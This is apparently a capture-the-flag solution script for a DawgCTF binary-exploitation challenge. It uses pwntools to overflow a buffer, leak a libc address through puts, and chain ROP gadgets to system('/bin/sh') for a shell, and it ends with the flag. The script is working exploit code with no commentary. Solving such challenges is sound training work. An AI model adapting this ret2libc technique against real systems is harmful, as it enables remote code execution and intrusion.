### Code

```py
from pwn import *
import time

p = process(['nc', 'connect.umbccd.net', '22237'])
# p = process(['./chall'])

p.sendline(b'2')
p.sendline(b'1')
p.sendline(b'4')

win1 = 0x401401
win2 = 0x401314
win3 = 0x4011e6

pop_rdi = 0x4017d6
payload1 = p64(win1)
payload2 = p64(pop_rdi) + p64(0xDEADBEEF) + p64(win2)
payload3 = p64(pop_rdi) + p64(0xDEADBEEF) + p64(0x4017d8) + p64(0xDEAFFACE) + p64(0x4017da) + p64(0xFEEDCAFE) + p64(win3)

puts_plt = 0x401040
puts_got = 0x404020
printf_got = 0x404030
setvbuf_got = 0x404058

main_address = 0x4015CE

# p.sendline(b'A'*0x98 + payload1+payload2+payload3)
# p.interactive()

payload = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_address)
p.sendline(b'A'*0x98 + payload)

p.recvuntil(b'0x401401\n')
res = p.readline()[:-1]
libc_address = u64(res.ljust(8, b'\x00')) - 0x84420
print(hex(libc_address))


context.arch = 'amd64'
# found libc here https://libc.rip/ from leaked addressess
libc = ELF("./libc6_2.31-0ubuntu9.17_amd64.so")
libc.address = libc_address
rop = ROP(libc)
rop.raw(rop.find_gadget(['ret']))
rop.system(next(libc.search(b'/bin/sh')))

p.sendline(b'2')
p.sendline(b'1')
p.sendline(b'4')

payload = b'A'*0x98 + rop.chain()
p.sendline(payload)

p.interactive()

# flag : DawgCTF{C0ngR4tul4t10ns_d15c1p13_y0u_4r3_r34dy_2_pwn!}
```
